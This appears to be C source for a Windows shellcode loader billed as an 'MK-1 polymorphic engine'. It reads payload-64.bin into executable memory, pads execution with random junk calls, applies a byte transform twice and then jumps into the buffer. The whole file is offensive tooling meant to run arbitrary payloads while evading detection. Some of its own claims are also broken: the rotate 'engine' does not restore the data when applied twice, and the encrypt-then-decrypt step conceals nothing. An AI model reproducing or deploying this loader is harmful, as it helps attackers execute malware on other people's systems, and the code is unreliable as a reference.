// Compile: cl mk1.c /O2 /link user32.lib

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>

typedef void(*ENGINE)(BYTE*, DWORD, BYTE);

// Heavy junk........
static void junk() {
    volatile DWORD a = 0xDEADBEEF;
    a ^= (DWORD)GetTickCount64();
    a = _rotl(a, 13);
    a += 0x11111111;
    Sleep(0);
    volatile BYTE b = 0xAA;
    b = ~b;
    b = _rotl8(b, 3);
}
#define JUNK do { for(int i = 0; i < 8 + rand()%15; i++) junk(); } while(0)

// 5 involutory engines — apply twice = original
static void eng_xor(BYTE* p, DWORD s, BYTE k)  { for(DWORD i=0;i<s;i++) p[i]^=k; }
static void eng_add(BYTE* p, DWORD s, BYTE k)  { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
static void eng_rol(BYTE* p, DWORD s, BYTE k)  { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
static void eng_rev(BYTE* p, DWORD s, BYTE k)  { for(DWORD i=0;i<s/2;i++) { BYTE t=p[i]; p[i]=p[s-1-i]; p[s-1-i]=t; } }
static void eng_not(BYTE* p, DWORD s, BYTE k)  { for(DWORD i=0;i<s;i++) p[i]=~p[i]; }

ENGINE engines[] = { eng_xor, eng_add, eng_rol, eng_rev, eng_not };
const int NUM = 5;

int main() {
    // entropy — unique every run
    ULARGE_INTEGER qpc; QueryPerformanceCounter((PLARGE_INTEGER)&qpc);
    unsigned long long tsc = __rdtsc();
    unsigned int seed = (unsigned int)(
        GetTickCount64() ^ 
        qpc.LowPart ^ qpc.HighPart ^ 
        (unsigned int)tsc ^ (unsigned int)(tsc >> 32) ^
        (uintptr_t)&seed
    );
    srand(seed);

    HANDLE h = CreateFileA("payload-64.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] Drop payload-64.bin in this folder!\n");
        return 1;
    }

    DWORD size = GetFileSize(h, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(h);
        printf("[-] Payload empty!\n");
        return 1;
    }

    BYTE* payload = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD read;
    if (!ReadFile(h, payload, size, &read, NULL) || read != size) {
        printf("[-] Read failed\n");
        CloseHandle(h); VirtualFree(payload, 0, MEM_RELEASE);
        return 1;
    }
    CloseHandle(h);

    int engine = rand() % NUM;
    BYTE key = (BYTE)rand();

    printf("[+] MK-1 POLYMORPHIC ENGINE #%d/5 (key 0x%02X) — %d bytes\n", engine+1, key, size);

    JUNK;                              // Random heavy junk
    engines[engine](payload, size, key); // Encrypt
    engines[engine](payload, size, key); // Decrypt → original
    JUNK;                              // More junk

    printf("[+] Executing payload...\n");
    FlushInstructionCache(GetCurrentProcess(), payload, size);
    ((void(*)())payload)();

    VirtualFree(payload, 0, MEM_RELEASE);
    return 0;
}
